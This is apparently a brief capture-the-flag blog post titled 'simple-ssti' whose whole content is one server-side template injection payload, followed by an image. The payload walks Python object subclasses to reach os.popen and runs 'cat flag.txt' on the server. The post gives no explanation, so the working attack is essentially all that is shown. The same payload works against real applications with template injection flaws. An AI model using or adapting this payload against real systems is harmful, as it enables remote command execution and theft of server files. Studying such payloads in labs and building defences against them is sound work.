---
layout: post
title: "simple-ssti"
categories: [Web Hacking]
tags: [ssti, security, ctf, exploitation]
last_modified_at: 2025-04-22
---

{% raw %}
```python
{{"".__class__.__base__.__subclasses__()[109].__init__.__globals__['sys'].modules['os'].popen('cat%20flag.txt').read()}}
```
{% endraw %}

![Image](https://blog.kakaocdn.net/dna/xbhaI/btsNvbFUms2/AAAAAAAAAAAAAAAAAAAAAEJYSjtY2KDfIuKKGtnqHYwDrWQW8P8gNannPXRNbwr7/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1769871599&allow_ip=&allow_referer=&signature=NVcjyyufX9pqu87pDvYTTvUmS1Y%3D)